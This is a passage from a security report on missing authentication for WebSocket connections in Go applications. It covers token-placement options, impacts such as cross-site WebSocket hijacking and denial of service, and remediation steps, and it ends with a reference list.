| **JWT/Opaque Token in `Authorization` Header** | Extract token from `r.Header.Get("Authorization")` (e.g., "Bearer <token>") and validate it before upgrade. Client JS must add this header to the handshake request (not standard via `new WebSocket()`). Requires custom client or library support for handshake headers. | Stateless; widely used for APIs; good for cross-domain scenarios. | Standard browser WebSocket API doesn't allow setting arbitrary headers for handshake. Requires custom client logic or specific library features. | `Origin` validation still recommended as a defense-in-depth measure, though primary auth is token-based. |
| **Token in URL Query Parameter** | Extract token from `r.URL.Query().Get("token")` before upgrade. | Easy for clients to implement. | **Security Risk:** Tokens can be logged by servers, proxies, or appear in browser history. Generally discouraged for long-lived tokens. | `Origin` validation is essential. Use only with short-lived, single-use tokens if absolutely necessary. |
| **Ephemeral Token (via POST then WS Handshake)** | 1. Client POSTs to an auth endpoint, gets a short-lived token. 2. Client includes this token in WS handshake (e.g., query param or `Sec-WebSocket-Protocol` subprotocol). Server validates. | More secure than long-lived tokens in query params. Reduces risk of token logging/replay.| More complex to implement (two-step process). Custom server-side logic for token generation and validation. | Strict `Origin` validation on both the POST request and the WebSocket handshake. Token should be single-use. |
| **`Sec-WebSocket-Protocol` Subprotocol Token** | Client includes token as a subprotocol: `new WebSocket(url, ["token.<jwt>"])`. Server extracts from `r.Header.Get("Sec-WebSocket-Protocol")` and validates. | Can be set by standard browser WebSocket API. | Misuses the subprotocol header; token might be logged. Limited token length. Potential compatibility issues with proxies/intermediaries. | Strict `Origin` validation. Token validation is primary. |

Choosing the right strategy depends on the application's architecture, client types, and security requirements. For browser-based clients, session cookies with robust `Origin` validation or an ephemeral token mechanism are generally preferred.

## **Scope and Impact**

**Scope:**

The "No Authentication on WebSocket" vulnerability can affect any Golang application that implements WebSocket communication without enforcing proper client authentication prior to or during the connection upgrade. This includes:

- **Server-side Application Logic:** The primary scope is the backend Golang code responsible for handling WebSocket connections and processing messages.
- **Public-facing and Internal Endpoints:** Both internet-exposed WebSocket endpoints and those intended for internal use are at risk if authentication is not implemented, though the threat actors and likelihood may differ.
- **Client-side Implications (via CSWH):** If Cross-Site WebSocket Hijacking is possible due to missing `Origin` validation, the scope extends to the security of authenticated user sessions on the client-side, as their sessions can be exploited by malicious third-party websites.
- **Diverse Application Types:** Applications ranging from real-time chat applications, live data feeds, online gaming, collaborative tools, to IoT device communication can be affected if they utilize WebSockets insecurely.

**Impact:**

The impact of exploiting unauthenticated WebSockets can be severe and multifaceted, affecting confidentiality, integrity, availability, and accountability:

1. **Confidentiality:**
    - **Unauthorized Data Disclosure:** Attackers can intercept or receive sensitive data transmitted over the WebSocket connection. This could include private messages, Personally Identifiable Information (PII), financial details, proprietary business data, or system status updates. For example, an attacker could listen in on a private chat or exfiltrate user profile information.

2. **Integrity:**
    - **Unauthorized Data Modification/Action Execution:** Attackers can send malicious messages to the server, potentially modifying data, executing unauthorized actions, or disrupting application logic. This could involve posting spam, manipulating user settings, triggering unintended business processes, or even executing commands if the WebSocket handler has such capabilities. A reported vulnerability in Directus allowed unauthenticated users full CRUD operations with admin privileges via WebSockets.
        
3. **Availability:**
    - **Denial of Service (DoS):** Unauthenticated endpoints are susceptible to DoS attacks. Attackers can overwhelm the server by opening a large number of WebSocket connections or by sending a high volume of messages, consuming resources like memory, CPU, and network bandwidth. In some cases, specially crafted messages can crash WebSocket server processes, as seen with CVE-2025-43855.
        
4. **Accountability:**
    - **Untraceable Actions:** Actions performed through an unauthenticated WebSocket connection cannot be reliably attributed to a specific user. This lack of accountability hinders incident response, auditing, and forensic analysis.
5. **Business Impact:**
    - **Reputational Damage:** Security breaches involving real-time communication can severely damage user trust and the application's reputation, especially for platforms where real-time interaction is a core feature.
    - **Financial Losses:** Direct financial losses can occur if the vulnerability allows unauthorized transactions, fraud, or theft of valuable data. Service disruptions also lead to financial costs.
    - **Regulatory Non-Compliance:** If PII or other regulated data is exposed, the organization may face fines and legal repercussions under data protection laws like GDPR, CCPA, etc..
    - **Loss of User Trust:** Users expect their real-time interactions to be private and secure. A breach of this trust can lead to user churn and difficulty acquiring new users.

The ripple effects of such a vulnerability can be extensive. For instance, exfiltrated data might be used for identity theft, phishing campaigns, or corporate espionage. Compromised integrity could lead to incorrect business decisions based on manipulated data. The impact on user trust is particularly significant for applications whose value proposition is built around secure and reliable real-time communication.

## **Remediation Recommendation**

Addressing the "No Authentication on WebSocket" vulnerability requires a systematic and proactive approach to security, integrating robust authentication and authorization mechanisms into the design and implementation of WebSocket communications in Golang applications.

1. **Prioritize Authentication at Handshake:** The most critical remediation step is to implement mandatory and robust client authentication *before* the WebSocket connection is upgraded from HTTP. This ensures that only legitimate, identified clients can establish a persistent WebSocket channel.
2. **Enforce Strict `Origin` Header Validation:** Alongside authentication, always validate the `Origin` header in the HTTP handshake request against a restrictive allowlist of trusted domains. This is paramount to prevent Cross-Site WebSocket Hijacking (CSWH), even if session cookies are used for authentication. Do not use wildcard origins or overly permissive configurations.

3. **Mandate Secure WebSockets (`wss://`):** Disable unencrypted `ws://` connections entirely. Enforce the use of `wss://` by ensuring your server is properly configured with TLS certificates. This protects data in transit from eavesdropping and modification.

4. **Adopt Standard and Proven Authentication Mechanisms:**
    - Prefer established authentication patterns like session cookies (when combined with strong `Origin` validation and CSRF protection if applicable) or bearer tokens (e.g., JWTs) transmitted securely in HTTP headers during the handshake.
    - Avoid complex or custom post-connection authentication protocols unless absolutely necessary and thoroughly vetted, as they are prone to design flaws.

5. **Implement the Principle of Least Privilege:** Once authenticated, ensure that the WebSocket connection operates with the minimum necessary permissions for the authenticated user. Authorization checks should be performed for actions initiated or data requested via WebSocket messages.
6. **Conduct Regular Security Audits and Penetration Testing:** Specifically include WebSocket endpoints and their authentication/authorization mechanisms in routine security assessments. Test for common vulnerabilities like authentication bypass, CSWH, and insecure data handling.
7. **Developer Training and Secure Coding Guidelines:** Educate Golang developers on WebSocket-specific security best practices, common pitfalls (like those outlined in this report), and the secure usage of chosen WebSocket libraries. Integrate these practices into secure coding standards.
8. **Utilize Secure Defaults and Library Configurations:** When using libraries like `gorilla/websocket` or `nhooyr.io/websocket`, ensure that security-related configurations (e.g., `CheckOrigin`, `OriginPatterns`, `InsecureSkipVerify`) are set to secure values and are not overridden with insecure settings for convenience.
    
9. **Defense in Depth:** Combine strong authentication with other security layers:
    - **Input Validation:** Validate all messages received over WebSockets to prevent injection attacks or other forms of malicious input.
    - **Rate Limiting:** Implement rate limiting on connection attempts and message frequency to mitigate DoS risks.
    - **Logging and Monitoring:** Ensure adequate logging of WebSocket connection events and message metadata (avoiding sensitive payload data) to detect and respond to suspicious activity.
10. **Shift-Left Security:** Integrate WebSocket security considerations early in the development lifecycle. This includes threat modeling for real-time features, secure design choices, and automated security checks in CI/CD pipelines. This proactive stance is more effective than reactively patching vulnerabilities.

A holistic approach that considers the entire lifecycle of the WebSocket connection—from the initial handshake, through message exchange, to termination—is essential for robust security. Simply adding an authentication check without considering `Origin` validation, encryption, or least privilege is insufficient.

## **Summary**

The "No Authentication on WebSocket" vulnerability in Golang applications represents a critical security flaw. It arises primarily because the WebSocket protocol itself does not enforce client authentication, leaving this responsibility to the application developer during the initial HTTP handshake.* Common developer oversights, such as neglecting to implement authentication checks before upgrading the HTTP connection or failing to properly validate the `Origin` header, are frequent causes.

This vulnerability allows unauthenticated or malicious clients to establish WebSocket connections, potentially leading to severe consequences. These include unauthorized access to sensitive real-time data, execution of unauthorized actions, session hijacking through Cross-Site WebSocket Hijacking (CSWH) if `Origin` validation is weak, and Denial of Service attacks. The impact on confidentiality, integrity, and availability can be substantial, often resulting in a High to Critical risk rating.

Effective remediation hinges on several key actions:

1. **Implementing robust client authentication** within the Golang HTTP handler *before* the WebSocket connection is upgraded.
2. **Enforcing strict `Origin` header validation** against an allowlist of trusted domains to prevent CSWH.
3. **Mandating the use of encrypted connections** via `wss://` to protect data in transit.

Adopting standard authentication patterns, applying the principle of least privilege, and incorporating WebSocket security into regular audits and developer training are crucial for mitigating this vulnerability. Securing WebSocket communication is not an optional add-on but a fundamental requirement for maintaining the trustworthiness and safety of modern real-time Golang applications. Developers and security teams must proactively address these concerns to protect their applications and users.

## **References**

Vaadata. (2025, March 12). *How WebSockets Work, Vulnerabilities and Security Best Practices*.
Datadog HQ. *Severity Scoring*.
Vulert. *CVE-2024-54151*.
CVEDetails. *CVE-2025-43855*.
OWASP. *WSTG - Latest - 4.11.10 Testing WebSockets*.
GitHub OWASP/ASVS. (2024, March 20). *Issue #1908: V13.5 WebSocket*.
pkg.go.dev. *nhooyr.io/websocket*.
Bright Security. (2025, March 25). *WebSocket Security: Top 8 Vulnerabilities and How to Solve Them*.
Ably. *Essential guide to WebSocket authentication*.
Ultra Red. *The Dark Side of WebSockets: Risks in Real-Time Communication*.
Bright Security. *WebSocket Security: Top 8 Vulnerabilities and How to Solve Them*..
    

    
Qwiet AI. (2025, January 16). *The Developer's Guide to WebSockets Security: Pitfalls and Protections*.

pkg.go.dev. [*github.com/gorilla/websocket*](https://github.com/gorilla/websocket).
    
Stack Overflow. (2015, March 10). *Configuring authentication headers for WebSocket connection*.
Google Cloud. *Triggering Cloud Run services with WebSockets*.
Ping Identity. *PingGateway WebSocket Proxy*.
DFINITY Forum. (2023, June 20). *WebSockets on the IC – A proof-of-concept*.
HackerOne. (2020, April 29). *Report #862835: GraphQL introspection query works through unauthenticated WebSocket*.
    
SecureFlag. *Broken Authentication in Go Lang*.
Druva. *WebSockets: Scale at Fractional Footprint in Go*..
- RFC 6455: The WebSocket Protocol.
- OWASP Application Security Verification Standard (ASVS).
- OWASP Web Security Testing Guide (WSTG).